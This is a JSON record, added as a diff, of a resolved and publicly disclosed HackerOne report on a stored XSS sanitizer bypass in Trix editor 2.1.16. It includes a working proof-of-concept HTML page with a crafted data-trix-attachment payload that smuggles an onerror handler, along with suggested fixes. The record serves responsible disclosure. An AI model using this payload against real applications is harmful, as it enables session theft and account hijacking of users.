@@ -1,0 +1,138 @@
+{
+  "id": 3581911,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTgxOTEx",
+  "url": "https://hackerone.com/reports/3581911",
+  "title": "Stored XSS on Trix Editor version latest (2.1.16) - Sanitizer Bypass ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2026-03-02T22:01:38.197Z",
+  "submitted_at": "2026-03-02T22:01:38.841Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "newbiefromcoma",
+    "url": "/newbiefromcoma",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 67,
+    "url": "https://hackerone.com/basecamp",
+    "handle": "basecamp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Basecamp",
+      "twitter_handle": "basecamp",
+      "website": "https://37signals.com/policies/security/response",
+      "about": "Basecamp is the leading online project manager and the birthplace of Ruby on Rails. Creators of the HEY email service."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-07-14T19:26:37.383Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-07-14T05:00:14.693Z",
+  "team_member_agreed_on_going_public_at": "2026-07-14T19:26:36.342Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Trix version `2.1.16` is vulnerable to a  Stored Cross-Site Scripting (XSS) flaw. The vulnerability arises from an unsafe interaction between Trix's custom `DOMPurify` configuration and its document serialization logic.\n\nTrix utilizes a `DOMPurify` hook (`src/trix/models/html_sanitizer.js`) that explicitly forces the sanitizer to retain any HTML attribute beginning with `data-trix-`. This creates an initial bypass of DOMPurify's strict attribute filtering.\n\nConcurrently, Trix's HTML serializer (`src/trix/core/serialization.js`) is responsible for converting the internal editor state back into HTML. To preserve standard attributes that are stripped during editing, Trix uses a custom attribute called `data-trix-serialized-attributes`, which contains a JSON string of property-value pairs. During serialization (e.g., when the form is submitted or `editor.value` is accessed), this JSON is parsed and the attributes are blindly set onto the element via `el.setAttribute(name, value)` without any further sanitization.\n\nBy embedding `data-trix-serialized-attributes` within the `content` property of a `data-trix-attachment` payload, an attacker can smuggle malicious JavaScript event handlers (such as `onerror=\"alert(1)\"`) past the initial `DOMPurify` pass. When the content is exported by Trix, the event handlers are injected into the final HTML output, leading to XSS when rendered by the victim application.\n\n---\n\n## Steps To Reproduce\nThe vulnerability can be reproduced in any application using Trix and can also be demonstrated directly on the official testing environment `https://trix-editor.org/`.\n\n1. Run this HTML code on browser.\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Trix Editor v2.1.16 XSS Demo</title>\n    <script src=\"https://cdn.jsdelivr.net/npm/trix@2.1.16/dist/trix.umd.min.js\"></script>\n    <link href=\"https://cdn.jsdelivr.net/npm/trix@2.1.16/dist/trix.min.css\" rel=\"stylesheet\">\n</head>\n<body>\n    <h1>Trix Editor v2.1.16 XSS Demo</h1>\n\n    <!-- \n    The following script simulates rendering user-supplied content that contains the malicious data-trix-attachment with our serialization bypass payload.\n  -->\n    <script>\n        document.write(`copy<figure data-trix-attachment=\"{&quot;contentType&quot;:&quot;text/html&quot;,&quot;content&quot;:&quot;&lt;img src=\\\\&quot;x\\\\&quot; data-trix-serialized-attributes=\\\\&quot;{&amp;quot;onerror&amp;quot;:&amp;quot;alert('XSS IN v2.1.16')&amp;quot;}\\\\&quot;&gt;&quot;}\"></figure>me`);\n    </script>\n\n    <h2>Simulate Backend Save & Render</h2>\n    <button onclick=\"triggerXSS()\">Trigger XSS</button>\n    <div id=\"output\"></div>\n\n    <script>\n        function triggerXSS() {\n            // 1. Get the serialized HTML output that Trix generated\n            var output = document.querySelector(\"trix-editor\").value;\n            console.log(\"Serialized HTML:\", output);\n\n            // 2. Simulate the application rendering this saved output on another page\n            var div = document.getElementById(\"output\");\n            div.innerHTML = output;\n        }\n    </script>\n</body>\n\n</html>\n```\n2. Copy the `copy me` text and paste it in trix editor.\n3. You will immediately see an alert pop up indicating successful arbitrary JavaScript execution.\n\n---\n\nThis vulnerability represents a direct bypass of the fixes applied for previously reported vulnerabilities in Trix :\n1. https://hackerone.com/reports/2521419 - Stored XSS on trix editor version 2.1.1\n2. https://hackerone.com/reports/2819573 - Mutation Based Stored XSS  on trix editor version 2.1.8\n\n---\n\n## Suggested Mitigation\n1. **Remove or constrain the wildcard `data-trix-` DOMPurify hook:** Ensure that only explicitly defined, harmless attributes (like `data-trix-id`) are retained. The regex `/^data-trix-/` in `src/trix/models/html_sanitizer.js` should be replaced with an explicit allowlist.\n2. **Re-Sanitize Deserialized Attributes:** In `src/trix/core/serialization.js`, when elements are restored from `data-trix-serialized-attributes`, `el.setAttribute` should only map to safe attributes (`class`, `src`, `href`) and explicitly deny JavaScript event handlers (`on*`). Attempting to filter this via DOMPurify before rebuilding the DOM is highly recommended.\n\n## Impact\n\nAny application that utilizes Trix to accept untrusted rich text input and renders the serialized output to other users is vulnerable to Stored Cross-Site Scripting (XSS). An attacker can successfully leverage this to steal session cookies, hijack user accounts, redirect victims to malicious sites, or perform actions on behalf of the user without their consent.",
+  "bounty_amount": "337.0",
+  "formatted_bounty": "$337",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5453430,
+      "file_name": "Basecamp_trix_xss.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/rpikzdh7dnnvpxbjjwd02ngm953x?response-content-disposition=attachment%3B%20filename%3D%22Basecamp_trix_xss.mp4%22%3B%20filename%2A%3DUTF-8%27%27Basecamp_trix_xss.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQS4YO3TOO%2F20260714%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260714T205410Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEFUaCXVzLXdlc3QtMiJHMEUCIHVHh%2B8eNk5FtXEDTwrZ6FhdPU50WGZkQAjww4sEDbXnAiEAjQwDKDRau3WL09eAZ%2Frv4SacFOXxzTPumAEd%2BCVs5woqsQUIHhADGgwwMTM2MTkyNzQ4NDkiDGFFD%2BEgIzUTnD1GjyqOBeSsb5okGEvvCblDL%2BGO8VM13E9vnLsAYwLov1gCIk7Nra9L3deGf0tyzo7QvEmLR72fZzztctLMR70nmnnY%2Fb3Dt5PSBgh79jqENC0BoMP37AMCAS%2B%2FtDxrOAvlINedKAsj1YsnPGAv8xw9ftRwVrBJb3FPARD1CPoCae1gWHdxCIjiliHG6BDbG0vXox792rKPwIrhb4wiDF21TWjCgijHlB4Cic7axUxDTGxiZffZmBqF5Kq4lWHGlbH1eNb4w5O0kQusdC%2BrJjTWJQmcNjZuE6S7rjtZIFjJ2BhBHk8NRAhNrb%2FdQ8ARC3RNdos9fzhEzUd%2Fb5zafNh%2FbL65xGWIrexg5j27%2Bxg8lUL9aC%2FXi1Yt9idrQOnjnhg7GWEF3rm3Kx%2BtDg%2FMQid2v%2BnguQqkrwjSwRjueUolT%2BW9b%2BUwwPkDxsT96ZSwfPXABNYoLcev2FQ4H7JTfNRUZP5R%2F1oyMsADnp3e7WLGdv7VL0RZJnJ0SSFbIfhFjJpSQPSt%2FSXiwA33xw3qQiQOllL33%2B8ke4gHOdTNITv%2B2%2FsNZSdzDQaI0iXDV20XAI%2BvXPyftp%2FEKyRxV0MS0hyOCyFaztWjjdhwH8FpM6gW%2FDdtFGMbnmMEc2X1QUqSqyMzhpqhg1CR7%2Bw1NTEKn8MGJMN4sNHg7AkC%2FN1QVl96fVmIrANxr3KOhEPwekZQpS9wX3358AiKKToupDnDGEdA7VkD8g0oW4FHZBuqPaG5ki7XcbW1iCVb%2FfItC5Ct3lOUbJDvWjBz5jjXJwCehbz84kmSYB%2BO2zErkhhs4deP6YIKKS1qEPhtvvFpq3IvbrAZPGzKDbLzgSZ2gHmzJVdxNNz%2BJrc6GjdRut1nf9a2hNqvRDC4vdrSBjqxAQx9rAzF9PtCAiK2ZBopMHzD35JJjOVUXxtH2rcRTxX9BxcdV05OS6hnGLjdt0iNIsZpPnxdCWJBqVnRy7KpVUKuWQIQvWNay9iSFRyO7pE9ACNBSTZvk%2BAbVUwsZgJgep8c%2BHcPq5C7hWe2mX5%2Fw%2FGB6oATYGEsVXLV4tz4yRr5ijIpQiFRUE6emRqfWXVdzLJ8Zx0cM9oWYMM%2FOHOyDsXBjANV7q%2BAxZ5CRQz%2FCJ7ZvQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=132bc54b574e1d5ff63e14190905218e79f398c709121211664fc23ac86de13b",
+      "file_size": 6878598,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-08-13T05:00:15.382Z",
+  "allow_singular_disclosure_after": 2534764.613227195,
+  "singular_disclosure_allowed": false,
+  "vote_count": 2,
+  "voters": [
+    "brumbelow",
+    "whoskow"
+  ],
+  "severity": {
+    "rating": "low",
+    "score": 3.0,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 4655,
+    "asset_type": "URL",
+    "asset_identifier": "app.basecamp.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
